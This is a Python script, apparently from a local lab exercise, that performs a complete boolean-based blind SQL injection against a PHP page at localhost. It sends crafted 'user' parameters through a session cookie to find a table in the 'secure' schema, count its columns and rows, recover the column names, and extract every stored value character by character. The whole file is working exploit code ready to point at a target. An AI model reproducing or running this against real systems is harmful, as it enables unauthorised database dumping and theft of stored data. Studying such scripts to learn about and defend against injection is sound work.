import requests
import string

"""
    Given table name, number of columns, number of rows and the columns name, print all
    the data of the table using SQLi.
    Goes through all rows, and for each row go through each column and print it's data.
    Similarly to what described below, the attack uses the indication that a right query will return in it's response
    text the string 'bobby' and thats our indication that the query succeeded.
    When no char was matched we know we've reached the end of the value and we go on to the next one.
    We done when reaching the last row and seeing two consecutive spaces.
    
"""
def print_data(url, cookies, table_name, num_of_cols, columns, num_of_rows):
    ascii_array = string.digits + string.ascii_letters
    data = []
    terminate = False
    value = ""
    word_idx = 0
    last_char = ""
    # For each row in the table
    for row_number in range(1, num_of_rows + 1):
        ascii_array = string.digits + string.ascii_letters
        if row_number == 3:
            ascii_array = string.digits + string.ascii_letters + string.punctuation + " "
        # For each column in the table
        for col_number in range(1, num_of_cols + 1):
            column_name = columns[col_number - 1]
            while True:
                if terminate == True:
                    break
                word_idx = word_idx + 1
                flag = False

                for c in ascii_array:
                    payload = {
                        'user' : f"bob' and substring((select {column_name} from secure.{table_name} limit {row_number - 1}, 1), {word_idx}, 1) = '{c}' -- //"
                    }
                    response = requests.get(url=url, cookies=cookies, params=payload)
                    if 'bobby' in response.text:
                        l = 2
                        if last_char == " " and c == " ":
                            terminate = True
                            break
                        
                        value = value + c
                        flag = True
                        print(f"found char {c} at index {word_idx} for row {row_number} at column {column_name}")
                        last_char = c 
                        break
                           

                if flag == False:
                    print(f"Value of row {row_number} for column {column_name} is {value}\n")
                    word_idx = 0
                    data.append(value)
                    value = ""
                    break
                

"""
    Find the number of rows in a given table using SQLi.
    Acts similarly to find_num_of_cols
    Returns num_of_rows
"""      
def find_num_of_rows(url, cookies, table_name):
    counter = 0
    num_of_rows = counter
    while True:
        counter = counter + 1
        # Select the amount of rows in secure.table_name with count(*)
        payload = {
            'user' : f"bob' and (select count(*) from secure.{table_name}) = {counter} -- //"
        }
        response = requests.get(url=url, cookies=cookies, params=payload)
        if 'bobby' in response.text:
            num_of_rows = counter
            print(f"Number of rows is: {num_of_rows}")
            break
    return num_of_rows


"""
    Finds column name with SQLi given the table name and it's number of columns.
    Goes through every ascii char and checks if it's the at the i'th index.
    If it does match than by the reference * we right and add the chatacter to the column name.
    The indication for the end of the name is when no character was matched.
    Returns the found columns.

"""
def find_columns_name(url, cookies, table_name, num_of_cols):
    columns = []
    ascii_array = string.ascii_letters + string.digits

    for col_num in range (1,num_of_cols + 1):
        column_name = ""
        word_idx = 0
        while True:
            flag = False
            word_idx = word_idx + 1
            for c in ascii_array:
                # Checks the column name in info schema colums.
                payload = {
                    'user' : f"bob' and substring((select column_name from information_schema.columns where table_name = '{table_name}' limit {col_num - 1}, 1), {word_idx}, 1) = '{c}' -- //"
                }
                response = requests.get(url=url, cookies=cookies, params=payload)
                if 'bobby' in response.text:
                    column_name = column_name + c
                    flag = True
                    print(f"found char {c} at index {word_idx} col num {col_num}")
                    break
                  
            if flag == False:
                print(f"Column number {col_num}'s name is: {column_name}\n")
                columns.append(column_name)
                break
        
    return columns


"""
    Finds the number of columns in a given table name with SQLi.
    Does that by increasing the number of counter and checking if it matches the number of columns.
    if it does than by the reference * we right and catch that number.
    Returns the number of columns in the given table name.
"""
def find_num_of_cols(url, cookies, table_name):
    counter = 0
    num_of_cols = counter
    while True:
        counter = counter + 1
        payload = {
            'user' : f"bob' and (select count(column_name) from information_schema.columns where table_name='{table_name}') = {counter} -- //"
        }
        response = requests.get(url=url, cookies=cookies, params=payload)
        if 'bobby' in response.text:
            num_of_cols = counter
            print(f"Number of columns is: {num_of_cols}")
            break
    return num_of_cols


"""
    Find table name with SQLi.
    Goes through every ascii char and checks if it's the at the i'th index.
    If it does, *the string 'bobby' will be at the response text, so it will be our indication that
    the injection worked, and therefore adds the character to the table name.* (* will be referenced at other function docs)
    Returns the Table name.
"""
def find_table_name(url, cookies):
    # Find Table_Name
    ascii_array = string.ascii_letters + string.digits
    table_name = ""
    i = 0
    while True:
        flag = False
        i = i + 1
        # For every possible ASCII char
        for c in ascii_array:
            # Checks if the char "c" is a appears in the table name at index i
            payload = {
                'user': f"bob' AND substring((SELECT table_name FROM information_schema.tables WHERE table_schema='secure' LIMIT 1),{i},1)='{c}' -- //"
            }
            response = requests.get(url, params=payload, cookies=cookies)

            if 'bobby' in response.text:
                table_name = table_name + c
                flag = True
                print(f"found char {c} at index {i}")
                break

        # If flag was not raised, non of the chars match the i'th index -> We reach it's end
        if flag == False:
            break

    print(f" The table name is: {table_name}")
    return table_name



if __name__ == "__main__":
    url = 'http://localhost:8000/blindsqli.php'

    # Before running the code, 1st log in to bob and copy your session cookie and replace the cookie value below with it.
    cookies = {
        'PHPSESSID' : '6e5ffaaa3fd34f98002c5fadbbc57081'
    }
    table_name = find_table_name(url=url, cookies=cookies)
    num_of_cols = find_num_of_cols(url= url, cookies=cookies, table_name=table_name)
    columns = find_columns_name(url=url, cookies=cookies, table_name=table_name, num_of_cols=num_of_cols)
    num_of_rows = find_num_of_rows(url=url, cookies=cookies, table_name=table_name)
    print_data(url=url, cookies=cookies, table_name=table_name, num_of_cols=num_of_cols, columns=columns, num_of_rows=num_of_rows)

